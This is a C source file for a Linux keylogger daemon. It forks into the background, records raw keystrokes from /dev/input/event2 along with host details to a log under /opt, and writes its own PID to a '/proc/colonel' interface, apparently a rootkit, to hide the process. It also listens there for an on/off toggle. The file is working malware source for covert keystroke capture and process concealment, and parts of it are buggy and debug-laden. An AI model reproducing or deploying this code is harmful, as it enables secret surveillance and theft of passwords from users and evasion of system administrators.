// DYNAMICALLY FIND EVENT!!!!
// Maybe use structs input_handle, input_dev, input_handler, or input_dev to determine dev/input/eventX
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <linux/input.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <inttypes.h>
#include <time.h>
#include <fcntl.h>


int main(void) {
	FILE *fp = NULL;										/* error log */
	FILE *evlog;											/* device input log */
	int ftty;												/* will read from /proc/colonel */
	int fd;													/* will read from device event file */
	int dir;												/* log directory */
	struct utsname unameData;								/* struct provides system information */
	uname(&unameData);										/* provides system information */
	char listening = 0;										/* toggles keylogger on/off */
	char cmd[1024];											/* stores commands */
	char kl[13] = "keylogger: 1";							/* defines what keylogger is listening for 
															 * on /proc/colonel */
	char *toggle;											/* listens for keylogger cmd */
	struct input_event ev;									/* using input_event so we know 
															 * what we're reading from the 
															 * event file */
	pid_t process_id = 0;
	pid_t sid = 0;
	process_id = fork();									/* fork a child process */

	if (process_id < 0) {
		printf("ERROR: fork failure\n");
		exit(1);
	}
	if (process_id > 0) {									/* exits the parent process */
		exit(0);
	}

	umask(0);												/* unmask the file mode */
	sid = setsid();											/* set unique session for 
															 * child process */
	if (sid < 0) {
		exit(1);
	}

	chdir("/opt/");											/* change daemon working directory */

	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

	dir = mkdir("./col_log", S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);     /* log directory */
	fp = fopen("./col_log/log.txt", "a+"); 					                       /* daemon log */
	fd = open("/dev/input/event2", O_RDONLY);			                           /* key event file */
	ftty = open("/proc/colonel", O_WRONLY);					/* open for write to hide keylogger pid */

	time_t curtime;
	time(&curtime);

	pid_t child_pid = getpid();							                     /* get keylogger pid */
	char dpid[10];								 	

	sprintf(dpid, "hp%jd", (intmax_t)child_pid);			                 /* forms command */
	write(ftty, dpid, sizeof(dpid));						                 /* passes command to the colonel */
	fprintf(fp, "PID: %jd -- %s", (intmax_t)child_pid, ctime(&curtime));     /* records current pid to log */
	close(ftty);
	
	if (!ftty) {
		fprintf(fp, "ERROR: /proc/colonel not found -- %s", ctime(&curtime));
		return 1;
	}
	// findev = open('/proc/bus/input/devices', O_RDONLY);
/*
* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
*/	
	if (geteuid() != 0) {									                 /* check if user is root */
		fprintf(fp, "ERROR: user not root -- %s", ctime(&curtime));
		return 1;
	}

	while(1) {
        fprintf(fp, "Top of while (no if), ftty open and reading -- listening: %d, toggle: %s", listening, toggle);				
		fflush(fp);
		read(fd, &ev, sizeof(struct input_event));			                  /* read from /dev/input/eventX */
		ftty = open("/proc/colonel", O_RDONLY);                               /* read from /proc/colonel */
		read(ftty, cmd, sizeof(cmd));						                  /* read from /proc/colonel */
		toggle = strstr(cmd, kl);							                  /* looks for change in /proc/colonel */
        fprintf(fp, "In while (no if), ftty open and reading -- listening: %d, toggle: %s", listening, toggle);

		if ((0 == listening) && (toggle != NULL)) {
            fprintf(fp, "In 1st if -- listening: %d, toggle: %s", listening, toggle);
			listening = !listening;
            evlog = fopen("./col_log/evlog.txt", "a+");                       /* key log */
            if (NULL == evlog) {
                fprintf(fp, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
                return 1;
            }
			fprintf(evlog, "\n\n%s", ctime(&curtime));				          /* timestamp */
			fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 			          /* system data */
					unameData.nodename, unameData.version,
					unameData.sysname, unameData.release, 
					unameData.machine);
			fflush(evlog);
			fprintf(fp, "Begin listening -- %s", ctime(&curtime));
			close(ftty);
            fprintf(fp, "Leaving 1st if, ftty closed -- listening: %d, toggle: %s", listening, toggle);
			continue;

		} else if ((1 == ev.type) && (1 == listening)) {	                  /* if typing (ev.type = 1) and keylogger is on */
			fprintf(fp, "In 2nd if, ftty still closed -- listening: %d, toggle: %s", listening, toggle);
            fprintf(evlog, "%i,%i-", ev.code, ev.value);	                  /* grabs keyboard input -- 
                    														   * ev.code = keycode
                    														   * ev.value = key state (0: key up, 1: key down) */
			fflush(evlog);

			ftty = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
            fprintf(fp, "In bottom of 2nd if, ftty open and non-blocking -- listening: %d, toggle: %s", listening, toggle);
			if (NULL == toggle) {
				listening = !listening;
                fclose(evlog);
				fprintf(fp, "End listening -- %s", ctime(&curtime));
				// fprintf(evlog, "\nEnd listening | %s", ctime(&curtime));
				// fflush(evlog);
                fprintf(fp, "In nested if, ftty open -- listening: %d, toggle: %s", listening, toggle);
				close(ftty);
                fprintf(fp, "In nested if, ftty closed -- listening: %d, toggle: %s", listening, toggle);
				continue;
			}
		}
	}

	fclose(evlog);
	fclose(fp);
	return 0;
}